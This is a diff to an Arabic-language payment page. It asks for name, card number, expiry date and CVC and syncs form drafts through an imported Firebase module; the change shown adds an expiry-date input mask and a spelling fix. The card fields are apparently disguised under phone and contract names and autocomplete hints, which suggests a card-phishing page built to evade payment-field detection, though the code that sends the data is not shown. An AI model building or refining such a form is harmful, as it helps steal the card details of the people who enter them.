@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>بيانات البطاقه | مكتب مساعد</title>
+  <title>بيانات البطاقة | مكتب مساعد</title>
   <link rel="stylesheet" href="order-details.css">
 </head>
 <body>
@@ -13,7 +13,7 @@
       <label>الاسم الكامل<input id="order-name" type="text" autocomplete="name" required></label>
       <label>رقم البطاقة<input id="order-phone" type="tel" autocomplete="tel" inputmode="tel" required></label>
       <div class="row contract-row">
-        <label>تاريخ انتهاء <input id="contract-end-date" type="text" inputmode="numeric" placeholder="MM/YYYY" pattern="(0[1-9]|1[0-2])/[0-9]{4}" title="أدخل التاريخ بصيغة MM/YYYY، مثال: 09/2026" required></label>
+        <label>تاريخ انتهاء <input id="contract-end-date" type="text" inputmode="numeric" maxlength="7" placeholder="MMYYYY" pattern="(0[1-9]|1[0-2])/[0-9]{4}" title="أدخل 6 أرقام، مثال: 092026" required></label>
         <label>cvc<input id="contract-number" type="text" inputmode="numeric" required></label>
       </div>
       <button type="submit">دفع</button>
@@ -23,6 +23,12 @@
   <script type="module" src="draft-sync.js"></script>
   <script type="module">
     import { syncDraft } from './firebase-sync.js';
+
+    const endDateInput = document.querySelector('#contract-end-date');
+    endDateInput.addEventListener('input', () => {
+      const digits = endDateInput.value.replace(/\D/g, '').slice(0, 6);
+      endDateInput.value = digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
+    });
 
     document.querySelector('#order-form').addEventListener('submit', async event => {
       event.preventDefault();
